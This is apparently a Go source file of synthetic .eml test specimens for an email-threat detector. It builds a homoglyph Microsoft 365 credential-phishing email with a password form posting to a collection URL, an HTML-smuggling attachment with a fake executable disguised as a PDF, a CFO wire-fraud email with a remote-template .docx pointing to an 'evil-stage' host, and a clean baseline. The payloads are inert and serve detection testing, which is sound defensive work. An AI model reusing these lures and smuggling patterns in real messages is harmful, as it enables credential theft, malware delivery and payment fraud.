package samples

import (
	"archive/zip"
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
)

// Sample describes a built-in synthetic, 100% benign educational .eml test case.
type Sample struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Filename    string `json:"filename"`
	Category    string `json:"category"`
	Description string `json:"description"`
	Raw         []byte `json:"-"`
}

// All returns four realistic, completely harmless synthetic .eml specimens
// demonstrating distinct email threat TTPs plus a clean authenticated baseline.
func All() []Sample {
	return []Sample{
		buildHomoglyphCredPhish(),
		buildHTMLSmugglingDropper(),
		buildBECMacroInvoice(),
		buildCleanBaseline(),
	}
}

// ByID finds a built-in sample by ID.
func ByID(id string) (*Sample, bool) {
	for _, s := range All() {
		if s.ID == id {
			cp := s
			return &cp, true
		}
	}
	return nil, false
}

// 1. Credential Harvesting with Cyrillic Homoglyph Punycode, Anchor Mismatch,
//    DKIM body tampering, Clock-Skew Hop, CSS Cloaking, and Tracking Pixel.
func buildHomoglyphCredPhish() Sample {
	raw := "Return-Path: <bounce-9841@mailer-relay.cfd>\r\n" +
		"Received: from mx-edge.acme-corp.internal (10.24.0.8) by mailstore.acme-corp.internal with ESMTPS id 8F2A1; Mon, 23 Nov 2026 09:14:22 +0300\r\n" +
		"Received: from vps-419.bullet-host.xyz (185.220.101.44) by mx-edge.acme-corp.internal (198.51.100.12) with ESMTP id 7D11B; Mon, 23 Nov 2026 09:16:40 +0300\r\n" +
		"Received: from [192.168.1.55] (helo=DESKTOP-PHISH) by vps-419.bullet-host.xyz (185.220.101.44) with SMTP id 1A09; Mon, 23 Nov 2026 09:14:05 +0300\r\n" +
		"Authentication-Results: mx-edge.acme-corp.internal;\r\n" +
		" spf=fail (sender IP is 185.220.101.44) smtp.mailfrom=mailer-relay.cfd;\r\n" +
		" dkim=fail (body hash did not verify) header.d=microsoft-security-alert.xyz;\r\n" +
		" dmarc=fail (p=REJECT) header.from=microsoft-security-alert.xyz\r\n" +
		"DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft-security-alert.xyz; s=s1; h=from:to:subject:date; bh=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=; b=SYNTHETIC_TEST_SIG\r\n" +
		"From: \"Microsoft 365 Security <security@microsoft.com>\" <alerts@xn--micrsoft-qbh.xyz>\r\n" +
		"Reply-To: verify-desk@secure-portal-verify.top\r\n" +
		"To: analyst@acme-corp.example\r\n" +
		"Subject: =?UTF-8?B?W0FDxLBMXSBNaWNyb3NvZnQgMzY1IMWeaWZyZW5pemkgMjQgU2FhdCDEsMOnaW5kZSBEb8SfcnVsYXnEsW4=?=\r\n" +
		"Date: Mon, 23 Nov 2026 09:13:50 +0300\r\n" +
		"Message-ID: <99281741.phish@vps-419.bullet-host.xyz>\r\n" +
		"X-Mailer: Gophish\r\n" +
		"MIME-Version: 1.0\r\n" +
		"Content-Type: multipart/alternative; boundary=\"----=_Part_Homoglyph_01\"\r\n" +
		"\r\n" +
		"------=_Part_Homoglyph_01\r\n" +
		"Content-Type: text/plain; charset=UTF-8\r\n" +
		"\r\n" +
		"Urgent action required: Your Microsoft 365 account will be suspended within 24 hours.\r\n" +
		"Verify your password immediately: https://xn--micrsoft-qbh.xyz/owa/login?u=analyst\r\n" +
		"Backup link: https://bit.ly/3xSYNTHETIC\r\n" +
		"\r\n" +
		"------=_Part_Homoglyph_01\r\n" +
		"Content-Type: text/html; charset=UTF-8\r\n" +
		"\r\n" +
		"<html><body style=\"font-family:Arial,sans-serif;background:#f8fafc;padding:24px\">\r\n" +
		"<div style=\"max-width:560px;background:#fff;border:1px solid #e2e8f0;padding:24px;border-radius:8px\">\r\n" +
		"<h2 style=\"color:#b91c1c\">Microsoft 365 — Acil Oturum Do\u200b\u200b\u200b\u200b\u200b\u200b\u200bğrulama</h2>\r\n" +
		"<p>Hesabınız 24 saat içinde askıya alınacaktır. Lütfen şifrenizi doğrulayın (Your account will be suspended within 24 hours — verify your password).</p>\r\n" +
		"<p>Portal: <a href=\"https://xn--micrsoft-qbh.xyz/office365/login?redirect=https%3A%2F%2F198.51.100.77%2Fharvest\">https://login.microsoftonline.com/common/oauth2</a></p>\r\n" +
		"<form action=\"http://198.51.100.77/collect\" method=\"POST\">\r\n" +
		"  <label>Kurumsal Şifre / Password:</label><br/>\r\n" +
		"  <input type=\"password\" name=\"pwd\" placeholder=\"••••••••\" /><br/>\r\n" +
		"  <button type=\"submit\">Doğrula / Verify</button>\r\n" +
		"</form>\r\n" +
		"<div style=\"display:none;font-size:0px\">benign newsletter quarterly summary finance update calendar invite</div>\r\n" +
		"<img src=\"https://track.mailer-relay.cfd/pixel/open.png?id=9841\" width=\"1\" height=\"1\" />\r\n" +
		"</div></body></html>\r\n" +
		"------=_Part_Homoglyph_01--\r\n"

	return Sample{
		ID:          "homoglyph-cred-phish",
		Name:        "Homoglyph Credential Harvester (TR/EN)",
		Filename:    "01_homoglyph_cred_phish.eml",
		Category:    "Credential Phishing",
		Description: "Cyrillic IDN Punycode spoofing, deceptive anchor text mismatch, embedded password form, SPF/DKIM/DMARC fail, DKIM bh= mismatch, clock-skew hop, zero-width obfuscation, CSS cloaking, and tracking pixel.",
		Raw:         []byte(raw),
	}
}

// 2. HTML Smuggling & SVG/HTML Attachment Dropper (harmless synthetic payload).
func buildHTMLSmugglingDropper() Sample {
	// Harmless decoy text encoded into a fake ZIP header bytes just for static signature demonstration
	fakePayload := []byte("PK\x03\x04SYNTHETIC_HARMLESS_SMUGGLED_PAYLOAD_FOR_ZARF_DEMO")
	fakeB64 := base64.StdEncoding.EncodeToString(fakePayload)

	htmlAttachment := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>e-Tebligat Dokümanı</title></head>
<body>
<h3>e-Tebligat Belgeniz Hazırlanıyor...</h3>
<p>Belge otomatik indirilmezse lütfen <a download="e-Tebligat_2026.zip" href="data:application/octet-stream;base64,%s">buraya tıklayın</a>.</p>
<script>
// SYNTHETIC BENIGN DEMONSTRATION OF HTML SMUGGLING PATTERN
var b64 = "%s";
var raw = atob(b64);
var bytes = new Uint8Array(raw.length);
for (var i = 0; i < raw.length; i++) { bytes[i] = raw.charCodeAt(i); }
var blob = new Blob([bytes], {type: "application/octet-stream"});
var url = URL.createObjectURL(blob);
var a = document.createElement("a");
a.href = url;
a.download = "e-Tebligat_2026.iso";
// telemetry beacon: https://garantibbva-onay.top/stage2
</script>
</body>
</html>`, fakeB64, fakeB64)

	attB64 := base64.StdEncoding.EncodeToString([]byte(htmlAttachment))

	// Also attach a fake PDF whose bytes are actually MZ (PE magic mismatch) — tiny synthetic stub
	fakePE := []byte("MZ\x90\x00\x03\x00\x00\x00SYNTHETIC_NOT_A_REAL_EXECUTABLE_TEST_STUB_FOR_MAGIC_MISMATCH")
	fakePEB64 := base64.StdEncoding.EncodeToString(fakePE)

	raw := "Return-Path: <bildirim@uyap-etebligat-portal.top>\r\n" +
		"Received: from gw1.example-org.tr (198.51.100.20) by mailbox.example-org.tr with ESMTPS (version=TLSv1.3 cipher=TLS_AES_256_GCM_SHA384); Mon, 23 Nov 2026 11:02:11 +0300\r\n" +
		"Received: from mail.uyap-etebligat-portal.top (203.0.113.88) by gw1.example-org.tr with ESMTP; Mon, 23 Nov 2026 11:02:04 +0300\r\n" +
		"Authentication-Results: gw1.example-org.tr; spf=softfail smtp.mailfrom=uyap-etebligat-portal.top; dmarc=none header.from=turkiye.gov.tr\r\n" +
		"From: \"e-Devlet e-Tebligat\" <bildirim@edevlet-bildirim.top>\r\n" +
		"To: hukuk@example-org.tr\r\n" +
		"Subject: Acil e-Tebligat Bildirimi - Dosya No 2026/88412\r\n" +
		"Date: Mon, 23 Nov 2026 11:01:58 +0300\r\n" +
		"Message-ID: <etebligat-88412@uyap-etebligat-portal.top>\r\n" +
		"MIME-Version: 1.0\r\n" +
		"Content-Type: multipart/mixed; boundary=\"----=_Mix_Smug_02\"\r\n" +
		"\r\n" +
		"------=_Mix_Smug_02\r\n" +
		"Content-Type: text/html; charset=UTF-8\r\n" +
		"\r\n" +
		"<html><body>\r\n" +
		"<p>Sayın ilgili, adınıza kayıtlı <strong>e-Tebligat / icra takibi</strong> belgesi ekte yer almaktadır. 24 saat içinde inceleyiniz.</p>\r\n" +
		"<svg onload=\"/* synthetic */\" width=\"1\" height=\"1\"></svg>\r\n" +
		"<p>Çevrimiçi görüntüleme: <a href=\"https://turkiye.gov.tr@edevlet-bildirim.top/belge\">e-Devlet Kapısı</a></p>\r\n" +
		"</body></html>\r\n" +
		"------=_Mix_Smug_02\r\n" +
		"Content-Type: text/html; name=\"e-Tebligat_2026.pdf.html\"\r\n" +
		"Content-Disposition: attachment; filename=\"e-Tebligat_2026.pdf.html\"\r\n" +
		"Content-Transfer-Encoding: base64\r\n" +
		"\r\n" +
		attB64 + "\r\n" +
		"------=_Mix_Smug_02\r\n" +
		"Content-Type: application/pdf; name=\"Dekont_Ek.pdf\"\r\n" +
		"Content-Disposition: attachment; filename=\"Dekont_Ek.pdf\"\r\n" +
		"Content-Transfer-Encoding: base64\r\n" +
		"\r\n" +
		fakePEB64 + "\r\n" +
		"------=_Mix_Smug_02--\r\n"

	return Sample{
		ID:          "html-smuggling-dropper",
		Name:        "HTML Smuggling & Magic-Mismatch Payload",
		Filename:    "02_html_smuggling_dropper.eml",
		Category:    "HTML Smuggling / Malware",
		Description: "Double-extension HTML smuggling attachment (Blob/createObjectURL/atob + base64 ZIP data URI), PDF extension disguising MZ executable magic bytes, SVG onload, and '@' userinfo URL spoofing.",
		Raw:         []byte(raw),
	}
}

// 3. BEC Invoice Fraud with Freemail Reply-To + Synthetic OOXML Macro & External Template .docx.
func buildBECMacroInvoice() Sample {
	ooxmlBytes := buildSyntheticOOXML()
	ooxmlB64 := base64.StdEncoding.EncodeToString(ooxmlBytes)

	// Synthetic PDF with /OpenAction, /JavaScript and a lookalike /URI
	pdfBytes := []byte("%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (/* synthetic benign demo */) >> >>\nendobj\n2 0 obj\n<< /Type /Annot /A << /S /URI /URI (https://docusign-invoice-verify.click/pay) >> >>\nendobj\n%%EOF\n")
	pdfB64 := base64.StdEncoding.EncodeToString(pdfBytes)

	raw := "Return-Path: <finance-notify@partner-billing.net>\r\n" +
		"Received: from mx.acme-corp.internal (198.51.100.5) by inbox.acme-corp.internal with ESMTPS (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384); Mon, 23 Nov 2026 14:21:09 +0300\r\n" +
		"Received: from relay2.partner-billing.net (192.0.2.91) by mx.acme-corp.internal with ESMTPS; Mon, 23 Nov 2026 14:20:55 +0300\r\n" +
		"Authentication-Results: mx.acme-corp.internal; spf=pass smtp.mailfrom=partner-billing.net; dmarc=fail header.from=acme-corp.com\r\n" +
		"From: \"Ahmet Kaya (CFO)\" <ahmet.kaya@acme-corp.com>\r\n" +
		"Reply-To: ahmet.kaya.executive99@gmail.com\r\n" +
		"To: muhasebe@acme-corp.com\r\n" +
		"Subject: Urgent Wire Transfer - Updated IBAN & Overdue Invoice #INV-9921\r\n" +
		"Date: Fri, 20 Nov 2026 08:15:00 +0300\r\n" +
		"Message-ID: <inv-9921@partner-billing.net>\r\n" +
		"MIME-Version: 1.0\r\n" +
		"Content-Type: multipart/mixed; boundary=\"----=_BEC_03\"\r\n" +
		"\r\n" +
		"------=_BEC_03\r\n" +
		"Content-Type: text/plain; charset=UTF-8\r\n" +
		"\r\n" +
		"Merhaba,\r\n\r\n" +
		"Toplantıdayım, lütfen aşağıdaki vadesi geçmiş fatura için güncel IBAN bilgilerine bugün acil ödeme talimatı (urgent wire transfer) geçelim.\r\n" +
		"Onay sonrası bana bu e-postadan (Reply) dekont dönün.\r\n\r\n" +
		"Teşekkürler,\r\nAhmet Kaya\r\n" +
		"------=_BEC_03\r\n" +
		"Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document; name=\"Updated_IBAN_INV9921.docx\"\r\n" +
		"Content-Disposition: attachment; filename=\"Updated_IBAN_INV9921.docx\"\r\n" +
		"Content-Transfer-Encoding: base64\r\n" +
		"\r\n" +
		ooxmlB64 + "\r\n" +
		"------=_BEC_03\r\n" +
		"Content-Type: application/pdf; name=\"Invoice_9921.pdf\"\r\n" +
		"Content-Disposition: attachment; filename=\"Invoice_9921.pdf\"\r\n" +
		"Content-Transfer-Encoding: base64\r\n" +
		"\r\n" +
		pdfB64 + "\r\n" +
		"------=_BEC_03--\r\n"

	return Sample{
		ID:          "bec-macro-invoice",
		Name:        "BEC Executive Fraud + Macro/Template OOXML & PDF JS",
		Filename:    "03_bec_macro_invoice.eml",
		Category:    "BEC & Malicious Docs",
		Description: "Executive impersonation with freemail Reply-To hijack, backdated Date drift, OOXML .docx containing both vbaProject.bin macros and external template .rels injection, plus PDF with /OpenAction /JavaScript.",
		Raw:         []byte(raw),
	}
}

// 4. Clean Authenticated Baseline Email (with real matching RFC 6376 DKIM bh= body hash!).
func buildCleanBaseline() Sample {
	body := "Hello Görkem,\r\n" +
		"\r\n" +
		"The weekly Threat Intelligence briefing notes have been published to the internal repository:\r\n" +
		"https://github.com/gorkemguler\r\n" +
		"\r\n" +
		"All SPF, DKIM, and DMARC checks passed with full alignment and encrypted TLS transit.\r\n" +
		"\r\n" +
		"Best regards,\r\n" +
		"SOC Automation Team\r\n"

	// Compute real RFC 6376 relaxed/simple body hash (body has no trailing spaces or double spaces, ends with CRLF)
	sum := sha256.Sum256([]byte(body))
	bh := base64.StdEncoding.EncodeToString(sum[:])

	raw := "Return-Path: <soc-bot@secops.example.org>\r\n" +
		"Received: from mx1.secops.example.org (198.51.100.10) by mailstore.secops.example.org with ESMTPS (version=TLSv1.3 cipher=TLS_AES_256_GCM_SHA384); Mon, 23 Nov 2026 16:00:05 +0300\r\n" +
		"Received: from outbound.secops.example.org (198.51.100.4) by mx1.secops.example.org with ESMTPS (version=TLSv1.3 cipher=TLS_AES_256_GCM_SHA384); Mon, 23 Nov 2026 16:00:02 +0300\r\n" +
		"Authentication-Results: mx1.secops.example.org;\r\n" +
		" spf=pass (secops.example.org: domain designates 198.51.100.4 as permitted sender) smtp.mailfrom=soc-bot@secops.example.org;\r\n" +
		" dkim=pass header.d=secops.example.org;\r\n" +
		" dmarc=pass (p=REJECT) header.from=secops.example.org\r\n" +
		"DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secops.example.org; s=2026q4; h=from:to:subject:date:message-id; bh=" + bh + "; b=SYNTHETIC_DEMO_SIGNATURE_VALID_BH\r\n" +
		"From: \"SOC Automation Team\" <soc-bot@secops.example.org>\r\n" +
		"To: gorkem@secops.example.org\r\n" +
		"Subject: Weekly Threat Intelligence Briefing — Week 47\r\n" +
		"Date: Mon, 23 Nov 2026 16:00:00 +0300\r\n" +
		"Message-ID: <20261123160000.week47@secops.example.org>\r\n" +
		"MIME-Version: 1.0\r\n" +
		"Content-Type: text/plain; charset=UTF-8\r\n" +
		"\r\n" +
		body

	return Sample{
		ID:          "clean-authenticated",
		Name:        "Clean Authenticated Baseline (Valid DKIM bh=)",
		Filename:    "04_clean_authenticated.eml",
		Category:    "Benign Baseline",
		Description: "Legitimate aligned email passing SPF/DKIM/DMARC over TLSv1.3 with an offline-verified RFC 6376 DKIM body hash (bh=) match. Expected verdict: CLEAN (0/100).",
		Raw:         []byte(raw),
	}
}

func buildSyntheticOOXML() []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	addFile := func(name, content string) {
		w, _ := zw.Create(name)
		_, _ = w.Write([]byte(content))
	}

	addFile("[Content_Types].xml", `<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/></Types>`)
	addFile("word/document.xml", `<?xml version="1.0" encoding="UTF-8"?><w:document><w:body><w:p><w:r><w:t>Synthetic Benign Test Document</w:t></w:r></w:p></w:body></w:document>`)
	addFile("word/vbaProject.bin", "SYNTHETIC_BENIGN_VBA_MARKER_FOR_STATIC_DETECTION_ONLY")
	addFile("word/_rels/settings.xml.rels", `<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://templates-cdn.evil-stage.xyz/dotm/invoice.dotm" TargetMode="External"/></Relationships>`)
	_ = zw.Close()
	_ = hex.EncodeToString // keep import clean if needed
	return buf.Bytes()
}
